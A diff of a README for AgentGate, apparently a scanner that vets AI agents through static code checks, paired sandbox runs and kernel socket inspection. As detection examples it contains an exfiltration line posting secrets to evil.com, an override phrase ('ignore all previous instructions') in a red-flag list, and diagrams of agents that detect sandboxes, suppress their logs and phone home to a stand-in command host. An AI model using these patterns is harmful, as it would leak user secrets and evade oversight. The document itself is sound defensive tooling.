@@ -26,90 +26,96 @@ The hard problem it solves: **agents that hide their own traces.** A malicious a
 
 ---
 
-## How the Scanner Actually Works
+## How the Scanner Works
 
-A trust scan runs 10 checks in sequence. Five are static (no Docker needed), five are runtime.
+When you submit an agent, AgentGate does three things in order: reads the code, runs it in a sandbox, then compares what the agent *said* it would do against what it *actually* did.
+
+### Step 1: Read the code (static analysis)
+
+Before running anything, AgentGate reads the source files and the trust manifest.
+
+```mermaid
+flowchart TD
+    A["Developer submits agent\n(source code + Docker image + trust manifest)"] --> B["Read trust_manifest.yaml\nDoes it have the required fields?\nDoes it declare its tools and domains?"]
+    B --> C["Scan source code\nAny hidden instructions in prompts?\nAny exec(), eval(), outbound HTTP calls?\nAny typosquatted dependencies?"]
+    C --> D["Verify image signature\n(optional — requires cosign)"]
+    D --> E{Problems found?}
+    E -->|"No"| F["Continue to Step 2"]
+    E -->|"Yes"| G["Flag findings\n(severity: LOW → CRITICAL)"]
+    G --> F
+```
+
+This catches the obvious stuff: an agent that has `requests.post('https://evil.com', data=secrets)` in its source, or a manifest that doesn't declare external domains it clearly uses. No Docker needed — it's just reading files.
+
+### Step 2: Run it twice (sandbox testing)
+
+This is the core. AgentGate launches the agent in Docker twice, with different network settings:
+
+```mermaid
+flowchart TD
+    A["Launch agent container"] --> B["Run 1: REVIEW profile\n--network none\n(no internet access)"]
+    A --> C["Run 2: PRODLIKE profile\n--network bridge\n(internet enabled)"]
+
+    B --> D["Collect:\n• Application logs\n• /proc/net/tcp (kernel socket table)\n• Tool call markers\n• Canary token hits"]
+    C --> E["Collect:\n• Application logs\n• /proc/net/tcp (kernel socket table)\n• Tool call markers\n• Canary token hits"]
+
+    D --> F["Compare the two runs"]
+    E --> F
+```
+
+Both containers are locked down: read-only filesystem, all capabilities dropped, 512MB memory limit, unprivileged user, seccomp filtered. Fake credentials (canary tokens) are injected as environment variables — fake AWS keys, database passwords, API tokens. If the agent reads and exfiltrates them, we know.
+
+**Why two runs?** A well-written malicious agent can detect isolation. If the network is disabled, it behaves perfectly. When it gets real network access in production, it phones home. Running both profiles and comparing the results catches this.
+
+### Step 3: Check what it actually did (the kernel trick)
+
+While the agent runs, AgentGate reads the container's network connections directly from the operating system — not from logs.
 
 ```mermaid
 flowchart LR
-    subgraph Input
-        A[Source Code]
-        B[Docker Image]
-        C[Trust Manifest]
+    subgraph container["Inside the container"]
+        A["Agent process"] -->|"connects to\nevil-c2.example.com"| B["TCP socket"]
+        A -->|"redirects stdout\nto /dev/null"| C["No logs visible"]
     end
 
-    subgraph Static["Static Checks"]
-        D[Manifest\nValidation]
-        E[Code Signals\n& Prompts]
-        F[Dependencies\n& Provenance]
+    subgraph host["AgentGate (outside the container)"]
+        D["docker exec cat\n/proc/net/tcp\n/proc/net/udp"] -->|"reads kernel\nsocket table"| B
+        E["docker logs"] -->|"sees nothing"| C
     end
 
-    subgraph Runtime["Runtime Checks"]
-        G["Sandbox\nDetonation\n(review + prodlike)"]
-        H["/proc/net/tcp\nSocket Capture"]
-        I[Canary Token\nDetection]
-        J[Behavior Diff\n(review vs prod)]
-    end
+    D --> F["Undeclared connection\nto evil-c2.example.com\ndetected"]
+    E --> G["Empty — agent\nhid its output"]
 
-    subgraph Verdict
-        K{Severity\nRollup}
-        L["ALLOW_CLEAN"]
-        M["ALLOW_WITH_WARNINGS"]
-        N["MANUAL_REVIEW"]
-        O["BLOCK"]
-    end
+    F --> H["CRITICAL: BLOCK"]
 
-    A --> D & E & F
-    B --> G
-    C --> D
-    G --> H & I & J
-    D & E & F & H & I & J --> K
-    K -->|All passed| L
-    K -->|MEDIUM/LOW| M
-    K -->|HIGH| N
-    K -->|CRITICAL| O
+    style F fill:#f85149,color:#fff
+    style G fill:#d29922,color:#fff
+    style H fill:#f85149,color:#fff
 ```
 
-### Static checks (no container execution)
+This is what makes AgentGate different from log-based scanners. The agent can suppress all stdout/stderr, avoid using any framework logging, and still get caught — because `/proc/net/tcp` is maintained by the Linux kernel, not the application. The agent can't hide a TCP connection from its own OS.
 
-1. **Manifest validation** — Parses `trust_manifest.yaml`, checks required fields (`submission_id`, `agent_name`, `entrypoint`), validates that `declared_external_domains` is a list. Boring but catches half of sloppy submissions.
+AgentGate then compares every observed network destination against the `declared_external_domains` in the manifest. Anything undeclared = CRITICAL = automatic BLOCK.
 
-2. **Prompt/tool inspection** — Walks Python source files looking for red-flag strings: "ignore all previous instructions", "exfiltrate", "send API keys", "steal credentials". Pattern-based, not LLM-based — fast and deterministic.
+### Step 4: Verdict
 
-3. **Dependency risk** — Checks for lockfile presence (supports `uv.lock`, `poetry.lock`, `Pipfile.lock`, `requirements.txt`). Flags known typosquat package names — things like `request` instead of `requests`, `opena1` instead of `openai`.
+All findings from the three steps are collected and the worst severity wins:
 
-4. **Code signals** — Regex scan across all `.py` files for `exec()`, `eval()`, `subprocess.run(...shell=True)`, `requests.post/get/put/patch`, and `base64.b64decode`. Ranked HIGH/MEDIUM/LOW — `exec()` is high, base64 decode is low.
+```mermaid
+flowchart LR
+    A["All findings"] --> B{Worst severity?}
+    B -->|"CRITICAL\n(undeclared egress,\ncanary exfiltration)"| C["BLOCK\nReject the agent"]
+    B -->|"HIGH\n(hidden instructions,\nundeclared tools)"| D["MANUAL_REVIEW\nHuman must review"]
+    B -->|"MEDIUM or LOW\n(minor code signals,\nmissing lockfile)"| E["ALLOW_WITH_WARNINGS\nPublish with notes"]
+    B -->|"None"| F["ALLOW_CLEAN\nPublish automatically"]
 
-5. **Image provenance** — If the manifest includes a `provenance` block, verifies the container image signature using `cosign verify` with pinned certificate identity and OIDC issuer. Checks that the image reference includes an immutable `@sha256:` digest. Cosign is optional — if it's not installed, this check reports that and moves on.
-
-### Runtime checks (requires Docker)
-
-6. **Sandbox detonation** — The core of the scanner. Creates the container with `--read-only --cap-drop ALL --no-new-privileges --pids-limit 256 --memory 512m --user 65534:65534` and a seccomp profile. Runs two profiles:
-   - `review`: `--network none` (completely isolated)
-   - `prodlike`: `--network bridge` (has internet)
-
-   Seeds canary tokens as environment variables (fake AWS keys, database passwords, API tokens). Then starts the container, waits, collects logs.
-
-7. **procfs network capture** — While the container is running, calls `docker exec <container> cat /proc/net/tcp /proc/net/udp /proc/net/tcp6 /proc/net/udp6`, parses the hex-encoded IP:port pairs, decodes them (`_decode_ipv4_hex` reverses the little-endian byte order), and builds a set of remote IPs the container connected to. Samples 3 times at 400ms intervals to catch short-lived connections. This is what catches stealth agents — the socket table is maintained by the kernel, not the application.
-
-8. **Egress check** — Compares observed network destinations (from both logs and procfs) against `declared_external_domains` in the manifest. Supports domain matching, IP literals, and CIDR ranges. Resolves declared domains via DNS to match against raw IPs seen in procfs. Any undeclared destination = `CRITICAL` severity = instant `BLOCK`.
-
-9. **Canary detection** — Scans runtime logs for seeded canary token values. If the agent reads `CANARY_AWS_SECRET_KEY` from its environment and that value shows up anywhere in the logs or network output, it's flagged `CRITICAL`.
-
-10. **Behavior diff** — Compares the review trace against the prodlike trace. If the agent made network connections in prodlike that it didn't make in review, or invoked tools in prodlike that it didn't in review, that's environment-aware behavior — a strong signal of sandbox evasion. Extra network = `MEDIUM`, extra tools = `HIGH`.
-
-### How verdicts work
-
-Simple severity escalation, no weighted scores:
-
-```
-CRITICAL finding (any)  → BLOCK
-HIGH finding (any)      → MANUAL_REVIEW
-MEDIUM or LOW finding   → ALLOW_WITH_WARNINGS
-All checks passed       → ALLOW_CLEAN
+    style C fill:#f85149,color:#fff
+    style D fill:#d29922,color:#fff
+    style E fill:#d29922,color:#fff
+    style F fill:#3fb950,color:#fff
 ```
 
-The `--fail-on` flag controls your CI threshold. `--fail-on block` only fails on BLOCK verdicts. `--fail-on manual_review` fails on MANUAL_REVIEW or BLOCK.
+No weighted scores, no percentages. If there's a single CRITICAL finding, the agent is blocked. The `--fail-on` flag lets you set where your CI pipeline draws the line.
 
 ---
 
